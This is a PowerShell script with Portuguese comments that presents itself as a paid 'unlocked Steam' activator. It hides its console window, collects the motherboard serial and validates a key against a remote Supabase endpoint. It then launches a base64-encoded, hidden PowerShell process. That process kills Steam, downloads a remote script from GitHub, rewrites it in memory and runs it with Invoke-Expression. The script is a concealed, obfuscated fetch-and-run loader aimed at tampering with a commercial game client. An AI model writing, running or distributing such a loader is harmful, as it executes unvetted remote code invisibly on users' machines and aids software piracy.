# 1. Oculta a janela inicial (Console)
$showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms

# Captura HWID e Key
$hwid = (Get-CimInstance Win32_BaseBoard).SerialNumber.Trim()
$key = [Microsoft.VisualBasic.Interaction]::InputBox("Insira sua chave do produto:", "ATIVAR STEAM DESBLOQUEADA", "")

if (-not $key) { exit }

try {
    $url = "https://waedqlfiprmsdkwhjkea.supabase.co/functions/v1/smooth-worker"
    $body = @{ key = $key; hwid = $hwid } | ConvertTo-Json
    $auth = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -UserAgent "Mozilla/5.0"

    if ($auth.status -eq "authorized") {
        
        # Mensagem de sucesso
        [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")

        # Comando de fundo (Instalação + Log + Warning + Notepad)
        $bgTask = @"
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        
        # Define o caminho do log na pasta Temp do Windows
        `$logPath = "`$env:TEMP\SteamAtivador_Log.txt"
        
        # Inicia a gravação
        Start-Transcript -Path `$logPath -Force
        
        try {
            Write-Output "Iniciando processo de instalacao invisivel..."
            
            # Baixa o script da Steam original como texto
            `$s = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
            Write-Output "Script base baixado com sucesso."
            
            # --- EDIÇÃO AVANÇADA NA MEMÓRIA ---
            `$s = `$s -replace '\`$milleniumTimer\s*=\s*5', '`$milleniumTimer = 0'
            `$s = `$s -replace '\[void\]\s*\[System\.Console\]::ReadKey\([^)]*\)', ''
            `$s = `$s -replace '\[System\.Console\]::ReadKey\([^)]*\)', ''
            `$s = `$s -replace '\[Console\]::KeyAvailable', '`$false'
            
            # CORREÇÃO: Usando comando nativo do PowerShell em vez de Taskkill
            `$s = "Stop-Process -Name steam -Force -ErrorAction SilentlyContinue; " + `$s

            Write-Output "Script modificado na memoria. Executando instalacao..."
            
            # Executa o script modificado
            Invoke-Expression `$s

            Write-Output "Instalacao do script principal concluida."

            # Baixa o aviso e abre no notepad
            `$wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
            `$path = "`$env:TEMP\warning.txt"
            (New-Object System.Net.WebClient).DownloadFile(`$wUrl, `$path)
            Start-Process notepad.exe `$path
            Write-Output "Aviso final exibido ao usuario."
            
        } catch {
            Write-Error "ERRO FATAL DURANTE A EXECUÇÃO: `$(`$_.Exception.Message)"
        } finally {
            Stop-Transcript
        }
"@

        # Conversão para Base64
        $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
        
        # Inicia o processo totalmente oculto
        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden
        
        exit

    } else {
        [System.Windows.Forms.MessageBox]::Show("Chave inválida ou já vinculada a outro computador.", "Acesso Negado")
    }
} catch {
    [System.Windows.Forms.MessageBox]::Show("Erro ao validar: Verifique sua chave ou network.`n`nDetalhe: $($_.Exception.Message)", "Erro")
}
